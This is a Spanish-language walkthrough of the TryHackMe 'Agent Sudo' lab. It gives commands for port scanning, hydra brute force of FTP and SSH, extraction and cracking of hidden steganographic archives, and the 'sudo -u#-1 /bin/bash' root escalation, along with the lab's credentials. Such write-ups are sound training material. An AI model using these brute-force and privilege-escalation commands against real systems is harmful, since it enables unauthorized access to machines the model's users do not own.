+++
title = "Agent Sudo"
author = ["aisak"]
date = 2026-01-02
tags = ["tryhackme", "linux", "web", "ftp", "ssh", "steganography", "sudo"]
categories = ["writeups"]
draft = false
+++

<div class="ox-hugo-toc toc">

<div class="heading">Table of Contents</div>

- [Fase 1: Enumeración de Red](#fase-1-enumeración-de-red)
    - [Servicios detectados](#servicios-detectados)
- [Fase 2: Enumeración Web (User-Agent)](#fase-2-enumeración-web--user-agent)
- [Fase 3: Ataque de Credenciales](#fase-3-ataque-de-credenciales)
    - [Fuerza bruta contra SSH](#fuerza-bruta-contra-ssh)
    - [Fuerza bruta contra FTP](#fuerza-bruta-contra-ftp)
- [Fase 4: Enumeración FTP](#fase-4-enumeración-ftp)
- [Fase 5: Análisis de Imágenes y Esteganografía](#fase-5-análisis-de-imágenes-y-esteganografía)
    - [Uso de strings](#uso-de-strings)
    - [Uso de binwalk](#uso-de-binwalk)
- [Fase 6: Fuerza Bruta del ZIP](#fase-6-fuerza-bruta-del-zip)
- [Fase 7: Decodificación y Nuevas Credenciales](#fase-7-decodificación-y-nuevas-credenciales)
- [Fase 8: Acceso como James](#fase-8-acceso-como-james)
- [Fase 9: Investigación de la Imagen Alien](#fase-9-investigación-de-la-imagen-alien)
- [Fase 10: Escalada de Privilegios](#fase-10-escalada-de-privilegios)

</div>
<!--endtoc-->



## Fase 1: Enumeración de Red {#fase-1-enumeración-de-red}

Se identifican los servicios expuestos mediante un escaneo completo de puertos y detección de servicios.

Para ello se utilizó un **script propio en Python** que automatiza distintas fases de **nmap**. En este caso se usó la ****opción 1****, que realiza un escaneo completo de puertos abiertos y guarda el resultado en un archivo.

```bash
python nmap_script.py 10.66.130.189
```

El script ejecuta internamente el siguiente comando:

```bash
nmap -p- --open --min-rate 5000 -n -Pn 10.66.130.189 -oN openPorts
```

A partir de los puertos detectados, se procede con un escaneo de servicios.

```bash
nmap -p21,22,80 -sCV 10.66.130.189
```


### Servicios detectados {#servicios-detectados}

**21/tcp**: FTP
**22/tcp**: SSH
**80/tcp**: Apache HTTPD


## Fase 2: Enumeración Web (User-Agent) {#fase-2-enumeración-web--user-agent}

Al acceder al sitio web se presenta el siguiente mensaje:

> Dear agents,
>
> Use your own codename as user-agent to access the site.
>
> From,
> Agent R

Se prueba modificar el **User-Agent** con curl:

```bash
curl -A "user-agent" http://10.66.130.189
```

Inicialmente no se obtiene información relevante. La pista clave es seguir las redirecciones con la opción `-L`.

```bash
curl -A "C" -L http://10.66.130.189
```

> Attention chris,
>
> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
>
> From,
> Agent R

Esto revela el usuario **chris** y sugiere el uso de una contraseña débil.


## Fase 3: Ataque de Credenciales {#fase-3-ataque-de-credenciales}


### Fuerza bruta contra SSH {#fuerza-bruta-contra-ssh}

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://10.66.130.189
```

El ataque no resulta exitoso.


### Fuerza bruta contra FTP {#fuerza-bruta-contra-ftp}

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.66.130.189
```

Se obtienen credenciales válidas:

Usuario: `chris`
Contraseña: `crystal`

{{< figure src="/images/ftp-enum.png" >}}


## Fase 4: Enumeración FTP {#fase-4-enumeración-ftp}

Al autenticarse en el servicio FTP se descargan varios archivos, incluyendo imágenes y una carta.

{{< figure src="/images/content-letter-ftp.png" >}}

El mensaje indica que la contraseña de otro agente está oculta dentro de las imágenes.

{{< figure src="/images/getting-all-files-ftp.png" >}}


## Fase 5: Análisis de Imágenes y Esteganografía {#fase-5-análisis-de-imágenes-y-esteganografía}

Se analizan las imágenes usando diversas herramientas.


### Uso de strings {#uso-de-strings}

```bash
strings cutie.png
```

{{< figure src="/images/strings-img.png" >}}

Se observa el archivo `To_agentR.txt` incrustado.


### Uso de binwalk {#uso-de-binwalk}

```bash
binwalk -e cutie.png
```

{{< figure src="/images/binaries-in-img.png" >}}

La extracción genera varios archivos, destacando un ZIP cifrado.

{{< figure src="/images/content-of-cutieimg.png" >}}

```bash
file 8702.zip
```

> Zip archive data, AES encrypted


## Fase 6: Fuerza Bruta del ZIP {#fase-6-fuerza-bruta-del-zip}

Con la pista proporcionada por TryHackMe (**Mr. John**), se utiliza **zip2john** y **john the ripper**.

```bash
zip2john 8702.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

{{< figure src="/images/zip2john.png" >}}

{{< figure src="/images/john-in-action.png" >}}

La passphrase obtenida es:

> alien


## Fase 7: Decodificación y Nuevas Credenciales {#fase-7-decodificación-y-nuevas-credenciales}

{{< figure src="/images/to-agent-r-zip.png" >}}

```bash
echo QXJlYTUx | base64 -d
```

Resultado:

> area51

Esta contraseña se utiliza con **steghide** sobre la imagen restante, obteniendo credenciales para el usuario **james**.

{{< figure src="/images/agent-james.png" >}}


## Fase 8: Acceso como James {#fase-8-acceso-como-james}

{{< figure src="/images/enum-james.png" >}}

Se obtiene la primera flag `user.txt`.


## Fase 9: Investigación de la Imagen Alien {#fase-9-investigación-de-la-imagen-alien}

{{< figure src="/images/rsync-to-alien.png" >}}

{{< figure src="/images/google-image-search.png" >}}


## Fase 10: Escalada de Privilegios {#fase-10-escalada-de-privilegios}

```bash
sudo -l
```

{{< figure src="/images/sudo-dash-l.png" >}}

{{< figure src="/images/meme.jpg" >}}

```bash
sudo -u#-1 /bin/bash
```

{{< figure src="/images/ending.png" >}}
